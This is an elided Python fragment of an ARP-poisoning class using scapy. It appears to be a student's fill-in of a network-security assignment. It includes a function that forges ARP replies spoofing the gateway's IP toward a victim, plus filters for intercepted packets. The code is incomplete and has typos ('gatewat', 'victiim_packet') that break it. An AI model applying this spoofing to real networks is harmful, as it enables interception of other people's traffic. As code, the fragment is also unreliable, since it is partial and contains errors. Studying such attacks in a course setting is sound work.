...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet) -> bool:
        ...
        return packet.haslayer(S.IP) and packet[S.IP].src!=self.our_ip and packet[S.Ether].dst==self.gatewat
    ...
    def is_stolen_packet(self, packet) -> bool:
        ...
        """
        # TODO: IMPLEMENT THIS FUNCTION
        return packet.haslayer(S.IP) and packet[S.IP].src!=self.our_ip and packet[S.Ether].dst==self.our_mac
    ...
    def create_poison(self, victim_packet):
        ...
        """
        # TODO: IMPLEMENT THIS FUNCTION
        poison=S.ARP(op=2,psrc=self.gateway_ip,hwdst=victiim_packet[S.Ether].src,pdst=victim_packet[S.IP].src)
        return poison 
